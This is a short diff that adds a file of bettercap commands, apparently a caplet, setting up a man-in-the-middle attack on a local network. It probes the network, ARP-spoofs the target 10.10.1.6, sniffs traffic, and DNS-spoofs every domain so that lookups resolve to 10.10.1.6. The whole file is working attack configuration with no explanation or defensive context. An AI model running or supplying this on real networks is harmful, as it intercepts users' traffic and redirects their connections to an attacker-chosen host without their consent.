@@ -1,0 +1,9 @@
+net.probe on
+set arp.spoof.targets 10.10.1.6
+net.sniff on
+set dns.spoof.domains *
+set dns.spoof.address 10.10.1.6
+set dns.spoof.all true 
+dns.spoof on
+arp.spoof on
+
